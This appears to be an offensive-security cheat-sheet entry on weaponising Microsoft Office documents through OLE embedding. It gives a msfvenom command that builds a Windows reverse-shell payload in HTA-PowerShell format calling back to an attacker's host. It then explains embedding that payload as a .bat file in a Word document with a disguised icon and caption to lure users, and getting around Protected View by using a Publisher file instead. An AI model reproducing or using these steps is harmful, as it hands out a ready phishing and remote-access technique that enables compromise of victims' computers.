# Object Linking and Embedding

Microsoft have a feature called OLE that allow users to embed files in a Office document. In this sense, we can craft a malicious bat file and embed it in a Word document.

## Generating Shellcode

```bash
#-f: Output file is HTA to Powershell.
msfvenom -p windows/shell_reverse_tcp LHOST=$IPADDRESS LPORT=$PORT -f hta-psh -o /var/www/html/$FILENAME.hta
```

Once the shellcode has been created, we need to craft a malicious .bat file (which we will insert in a Word document). The structure of the .bat file should be:

```shell
START $RESULT_OF_MSFVENOM
```

Once the .bat file is ready, the final step is to embed it in a Word document. In order to do this, we need to navigete to **Insert > Object > Create from file**. Select the file and change the icon and caption in order to lure end users to open the file.

**Note:** After clicking the embedded object, a security warning pops out. User must accept this.

## Protected View Bypass

Microsoft Office documents that have been transmitted over the internet (via mail, downloads..) adds a second layer of security called "Protected View" which is activated once the document opens. We can bypass this by inserting an OLE element (.bat) inside a Microsoft Publisher (.pub) file which doesn't activate this security layer.

**Note:** Microsoft Publisher should be installed in the victim machine.
